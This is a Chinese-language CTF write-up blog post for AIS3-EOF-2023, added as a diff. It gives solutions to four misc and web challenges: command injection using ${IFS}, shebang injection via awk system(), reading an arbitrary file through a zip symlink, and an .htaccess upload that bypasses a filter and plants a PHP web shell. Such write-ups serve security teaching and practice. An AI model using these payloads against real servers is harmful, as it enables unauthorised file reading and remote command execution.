@@ -1,0 +1,100 @@
+---
+layout: post
+title: "[CTF] AIS3-EOF-2023 Writeup"
+date: 2023-01-08 +0800
+categories: CTF
+---
+
+## Misc
+
+### Washer
+nc畫面
+
+![](/images/2023/01/5TXNu9F.png)
+
+隨機生成6個字元，路徑為/tmp/<random*6>
+
+![](/images/2023/01/LkHgvkj.png)
+
+選項1是輸入的內容寫到/tmp/<random*6>
+
+選項2是讀出來
+
+選項3是將輸入的指定檔案的路徑，並執行
+
+![](/images/2023/01/uADO6YZ.png)
+
+![](/images/2023/01/zIZyqd6.png)
+
+解法:
+
+```
+選擇1
+cat${IFS}/flag
+選擇3
+/tmp/<random*6>
+```
+
+### Execgen
+
+![](/images/2023/01/4y2eNG0.png)
+
+輸入的內容會變成下面這樣，然後執行這個script
+
+```
+#!<你輸入的內容>(created by execgen)
+```
+
+![](/images/2023/01/MjDD8Wj.png)
+
+解法:
+
+```bash
+/usr/bin/awk BEGIN{system("cat /home/chal/flag")}
+```
+
+
+## Web
+
+### Share
+網站提供上傳zip檔案
+
+![](/images/2023/01/FrnF7gx.png){:h="50%" w="50%"}
+
+Source
+檢查zip內是否包含index.html,並將內容放到/static/<username>/index.html
+
+![](/images/2023/01/1vcNbXM.png)
+
+透過docker-compose.yaml，發現檔案在/flag.txt
+
+![](/images/2023/01/lux3aQ3.png)
+
+使用Symbolic link將./index.html連結到/flag.txt
+```bash
+ln -s /flag.txt index.html
+zip --symlink test.zip index.html
+```
+
+### Gist
+過濾條件
+ - 檔名包含ph
+ - 內容包含ph
+ - 檔案大小大於 0x100
+
+上傳.htaccess,把.htaccess當成php來執行
+```php
+<FilesMatch .htaccess>
+SetHandler application/x-httpd-p\
+hp
+Require all granted
+p\
+hp_flag engine on
+</FilesMatch>
+p\
+hp_value auto_prepend_file .htaccess
+#<?=`$_GET[1]`?>
+```
+## 小節
+再接再勵ㄅQQ
+![](/images/2023/01/Yqnd2ce.png)
